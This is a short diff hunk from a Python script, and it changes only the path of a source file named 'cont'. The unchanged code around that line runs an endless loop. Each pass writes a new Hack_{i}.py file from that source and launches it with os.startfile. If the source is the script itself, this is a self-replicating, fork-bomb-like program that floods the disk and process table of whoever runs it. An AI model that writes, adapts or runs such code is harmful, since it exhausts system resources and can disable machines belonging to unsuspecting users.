@@ -7,7 +7,7 @@ f'i = {i}'
 while True:
     i+=1
     file = open(f"Hack_{i}.py", "w+")
-    cont = open('Content/cont', 'r+')
+    cont = open('cont', 'r+')
     for text in cont:
         file.write(text)
     os.startfile(f"hack_{i}.py")
